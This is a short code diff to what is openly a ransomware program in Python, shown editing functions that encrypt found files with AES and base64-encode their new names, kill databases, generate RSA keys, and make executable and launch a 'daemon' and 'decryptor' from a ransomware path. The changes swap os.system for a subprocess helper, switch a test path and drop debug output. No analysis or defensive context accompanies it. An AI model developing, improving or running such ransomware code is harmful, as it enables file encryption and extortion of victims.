@@ -12,6 +12,7 @@ import random
 import base64
 import pickle
 import gc
+import subprocess
 
 from Crypto.PublicKey import RSA
 from Crypto.Hash import MD5
@@ -67,7 +68,6 @@ def start_encryption(files):
         base64_new_file_name = base64.b64encode(new_file_name)
 
         AES_and_base64_path.append((key, base64_new_file_name))
-    
     return AES_and_base64_path
 
 
@@ -79,9 +79,7 @@ def menu():
 
     kill_databases()
         
-    files = get_files.find_files(variables.test)
-    for f in files:
-        print(f)
+    files = get_files.find_files(variables.test_path)
 
     rsa_object = asymmetric.assymetric()
     rsa_object.generate_keys()
@@ -142,10 +140,7 @@ def drop_daemon_and_decryptor():
     os.chdir(variables.ransomware_path)
     os.system('chmod +x daemon')
     os.system('chmod +x decryptor')
-    os.system('./daemon')
-
-
-
+    utils.run_subprocess('./daemon')
 
 
 if __name__ == "__main__":
